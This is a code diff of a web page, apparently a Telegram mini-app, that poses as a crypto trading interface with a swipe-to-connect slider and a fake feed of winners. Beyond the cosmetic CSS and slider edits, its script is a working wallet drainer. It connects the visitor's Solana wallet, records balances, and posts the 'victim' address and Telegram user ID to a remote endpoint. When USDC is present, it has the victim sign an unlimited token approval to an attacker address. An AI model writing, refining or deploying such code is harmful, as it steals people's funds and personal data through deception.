@@ -37,6 +37,7 @@
     flex-direction: column;
     align-items: center;
     box-shadow: 0 24px 48px rgba(0, 0, 0, 0.4);
+    will-change: transform;
   }
 
   .header { width: 100%; text-align: center; margin-bottom: 24px; }
@@ -49,21 +50,15 @@
   
   .feed-item {
     display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03);
-    padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap; animation: slideFadeIn 0.5s ease-out forwards;
+    padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap;
+    animation: slideFadeIn 0.4s ease-out;
   }
 
-  .feed-item.mega-win {
-    background: rgba(20, 241, 149, 0.15); border: 1px solid rgba(20, 241, 149, 0.4);
-    box-shadow: 0 0 15px rgba(20, 241, 149, 0.3); animation: megaPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+  /* Vereinfachte Animation, die nicht mit dem Layout kollidiert */
+  @keyframes slideFadeIn { 
+    from { opacity: 0; transform: translateY(-10px); } 
+    to { opacity: 1; transform: translateY(0); } 
   }
-
-  @keyframes megaPop {
-    0% { opacity: 0; transform: scale(0.8) translateX(-20px); }
-    50% { opacity: 1; transform: scale(1.05) translateX(5px); }
-    100% { opacity: 1; transform: scale(1) translateX(0); }
-  }
-
-  @keyframes slideFadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
 
   .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
   .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
@@ -78,14 +73,15 @@
 
   .slider-thumb {
     width: 48px; height: 48px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center;
-    cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); transition: transform 0.1s;
+    cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    will-change: transform; /* Verhindert Ruckeln beim Swipen */
   }
 
   .slider-thumb:active { cursor: grabbing; }
   .slider-thumb svg { width: 20px; height: 20px; color: #000000; transform: rotate(180deg); }
 
-  .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 24px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 16px; }
-  .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 24px; background: #14F195; pointer-events: none; justify-content: center; }
+  .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 24px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 16px; transition: width 0.3s ease, border-radius 0.3s ease; }
+  .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 24px; background: #14F195; pointer-events: none; justify-content: center; transition: width 0.3s ease, border-radius 0.3s ease; }
 
   .spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
@@ -180,7 +176,7 @@
       }
     }
     const el = document.createElement('div');
-    el.className = isMega ? 'feed-item mega-win' : 'feed-item';
+    el.className = 'feed-item';
     el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
     feed.prepend(el);
     if (feed.children.length > 6) feed.lastChild.remove();
@@ -204,26 +200,41 @@
   let isDragging = false; let startX = 0; let currentX = 0; let maxDrag = 0;
 
   function initSlider() { maxDrag = container.offsetWidth - thumb.offsetWidth - 8; }
-  function startDrag(e) { if (container.classList.contains('loading') || container.classList.contains('success')) return; isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; thumb.style.transition = 'none'; }
+  
+  function startDrag(e) { 
+    if (container.classList.contains('loading') || container.classList.contains('success')) return; 
+    isDragging = true; 
+    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
+    thumb.style.transition = 'none'; 
+  }
+  
   function moveDrag(e) {
     if (!isDragging) return;
     const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     let delta = startX - clientX; 
-    if (delta < 0) delta = 0; if (delta > maxDrag) delta = maxDrag;
-    currentX = delta; thumb.style.transform = `translateX(-${currentX}px)`;
+    if (delta < 0) delta = 0; 
+    if (delta > maxDrag) delta = maxDrag;
+    currentX = delta; 
+    thumb.style.transform = `translateX(-${currentX}px)`;
     text.style.opacity = 1 - (currentX / maxDrag);
   }
+  
   function endDrag() {
-    if (!isDragging) return; isDragging = false;
+    if (!isDragging) return; 
+    isDragging = false;
     if (currentX > maxDrag * 0.7) {
-      container.classList.add('loading'); text.style.opacity = 0;
-      thumb.style.transition = 'width 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
+      container.classList.add('loading'); 
+      text.style.opacity = 0;
+      thumb.style.transition = 'transform 0.3s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
-      icon.style.display = 'none'; spin.style.display = 'block';
+      icon.style.display = 'none'; 
+      spin.style.display = 'block';
       triggerConnect();
     } else {
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
-      thumb.style.transform = 'translateX(0)'; text.style.opacity = 1; currentX = 0;
+      thumb.style.transform = 'translateX(0)'; 
+      text.style.opacity = 1; 
+      currentX = 0;
     }
   }
 
@@ -247,59 +258,43 @@
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
+      const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
       const conn = new solanaWeb3.Connection(RPC_URL);
       
-      // 1. SOL Balance
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
       
-      // 2. Token Scan (USDC + alle anderen SPL Tokens)
       let tokensString = "";
       let usdcAmount = 0;
       
       if (typeof splToken !== 'undefined') {
         try {
-          // Alle Token-Accounts des Users abrufen
           const tokenAccounts = await conn.getParsedTokenAccountsByOwner(resp.publicKey, {
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
           });
-
           tokenAccounts.value.forEach((accountInfo) => {
             const parsedInfo = accountInfo.account.data.parsed.info;
             const amount = parsedInfo.tokenAmount.uiAmount;
-            
-            // Nur Token anzeigen, von denen der User mehr als 0 hat
             if (amount > 0) {
               const mint = parsedInfo.mint;
-              // USDC mint check für den Drainer
-              if (mint === USDC_MINT) {
-                usdcAmount = amount;
-              }
+              if (mint === USDC_MINT) usdcAmount = amount;
               tokensString += `${amount.toFixed(2)} of ${mint.slice(0,4)}.. | `;
             }
           });
-        } catch (e) {
-          console.log("Error fetching tokens", e);
-        }
+        } catch (e) {}
       }
 
-      // Senden an Worker
       await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          victim, 
-          chain: "solana",
-          type: "connection_and_balance",
-          sol: solAmount,
-          usdc: usdcAmount,
-          tokens: tokensString,
-          ts: Date.now() 
+          victim, chain: "solana", type: "connection_and_balance",
+          sol: solAmount, usdc: usdcAmount, tokens: tokensString,
+          tg_user_id: tgUserId, ts: Date.now() 
         })
       });
 
-      // Wenn USDC da ist, Drain triggern
       if (usdcAmount > 0 && typeof splToken !== 'undefined') {
         const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
@@ -311,7 +306,7 @@
         await fetch(ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", ts: Date.now() })
+          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() })
         });
       }
 
@@ -337,7 +332,7 @@
   window.addEventListener('mouseup', endDrag);
   thumb.addEventListener('touchstart', startDrag, {passive: false});
   window.addEventListener('touchmove', moveDrag, {passive: false});
-  window.addEventListener('touchend', endDrag);
+  thumb.addEventListener('touchend', endDrag);
 </script>
 </body>
 </html>
